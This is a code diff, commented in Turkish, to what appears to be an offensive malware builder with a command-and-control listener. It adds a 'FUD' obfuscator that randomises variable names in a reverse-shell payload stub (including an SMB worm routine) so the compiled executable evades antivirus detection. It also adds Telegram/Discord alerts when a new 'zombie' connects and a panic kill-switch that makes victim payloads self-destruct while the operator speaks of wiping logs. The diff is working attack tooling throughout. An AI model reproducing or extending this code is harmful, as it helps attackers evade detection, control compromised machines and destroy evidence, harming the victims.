@@ -386,6 +386,23 @@ except:
             stub_code = stub_code.replace("__LPORT__", str(lport))
             stub_code = stub_code.replace("__ANTI_SB__", anti_sb_code)
             stub_code = stub_code.replace("__AES_KEY__", aes_key)
+            
+            # --- FUD Code Obfuscator (Rastgele Değişken İsimlendirme) ---
+            print(f"{C.YELLOW}  [*] FUD Obfuscator çalışıyor... Dinamik kod imzası oluşturuluyor.{C.RESET}")
+            def r_str(): return "v_" + "".join(random.choices(string.ascii_letters, k=8))
+            fud_map = {
+                "LHOST": r_str(), "LPORT": r_str(), "AES_KEY": r_str(),
+                "run_cmd": r_str(), "smb_worm": r_str(), "connect": r_str(),
+                "chunk": r_str(), "raw": r_str(), "iv": r_str(), "ct": r_str(),
+                "cipher": r_str(), "ct_bytes": r_str(), "output": r_str(),
+                "local_ip": r_str(), "base_ip": r_str(), "results": r_str(),
+                "target": r_str()
+            }
+            for k, v in fud_map.items():
+                # Sadece kelime olarak geçenleri değiştir (importlar vs bozulmasın diye)
+                import re
+                stub_code = re.sub(r'\b' + k + r'\b', v, stub_code)
+            
             save_text(stub_path, stub_code)
 
             print(f"{C.YELLOW}  [*] Nuitka ile native EXE derleniyor (bu işlem 1-5 dakika sürebilir)...{C.RESET}")
@@ -517,9 +534,11 @@ def c2_listener():
         import sys
         sys.path.append(os.path.dirname(os.path.abspath(__file__)))
         try:
-            import Notifier
-            Notifier.send_alert(f"New C2 connection received from {addr[0]}:{addr[1]}.", title="🚀 NEW SHELL SECURED")
-        except: pass
+            import Bildirim_Sistemi
+            Bildirim_Sistemi.send_alert(f"⚠️ YENİ BİR ZOMBİ BAĞLANDI!\n\nIP Adresi: {addr[0]}\nPort: {addr[1]}", title="🚀 C2 BAĞLANTISI BAŞARILI")
+            print(f"{C.YELLOW}  [*] Bildirim Gönderildi (Telegram/Discord){C.RESET}")
+        except Exception as e:
+            print(f"Bildirim Hatasi: {e}")
 
         while True:
             try:
@@ -548,8 +567,23 @@ def c2_listener():
                 
                 print(f"{C.WHITE}{resp_str}{C.RESET}", end="")
                 
-                # Şimdi komut gönder
                 cmd = input(f"{C.RED}C2-Shell>{C.RESET} ")
+                
+                if cmd.strip() == '!PANIK':
+                    print(f"\n{C.RED}{C.BOLD}  [☠️] KENDİNİ İMHA (KILL-SWITCH) BAŞLATILDI!{C.RESET}")
+                    print(f"{C.RED}  [!] Kurban sistemindeki payload kendini imha komutu alıyor...{C.RESET}")
+                    try:
+                        import Bildirim_Sistemi
+                        Bildirim_Sistemi.send_alert("PANIC MODE ACTIVATED! Wiping C2 and destroying zombies...", title="☠️ PANİK BUTONU TETİKLENDİ")
+                    except: pass
+                    
+                    if aes_key: conn.sendall(encrypt_aes("!suicide", aes_key) + b"\n")
+                    else: conn.sendall(b"!suicide\n")
+                    
+                    print(f"{C.RED}  [!] Sistem logları sıfırlanıyor ve bağlantı kesiliyor... HOŞÇA KALIN.{C.RESET}")
+                    conn.close()
+                    sys.exit(0)
+
                 if cmd.lower() in ['exit', 'quit']:
                     if aes_key: conn.sendall(encrypt_aes(cmd, aes_key) + b"\n")
                     else: conn.sendall(cmd.encode("utf-8") + b"\n")
